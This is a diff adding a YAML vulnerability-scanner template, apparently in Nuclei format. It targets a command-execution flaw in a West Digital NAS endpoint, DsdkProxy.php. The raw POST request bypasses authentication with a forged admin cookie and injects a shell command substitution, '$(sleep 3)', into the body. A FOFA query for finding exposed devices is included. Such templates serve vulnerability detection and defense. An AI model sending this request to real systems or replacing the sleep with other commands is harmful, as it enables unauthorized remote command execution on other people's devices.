@@ -1,0 +1,28 @@
+id: poc-qn66mnio75urc9f8
+info:
+  name: 西部数码 NAS DsdkProxy.php 存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qn66mnio75urc9f8'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qn66mnio75urc9f8
+    fofa: 'icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"'
+http:
+- raw:
+  - 'POST /web/dsdk/DsdkProxy.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: isAdmin=1;username=admin
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    '' $(sleep 3) '''
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
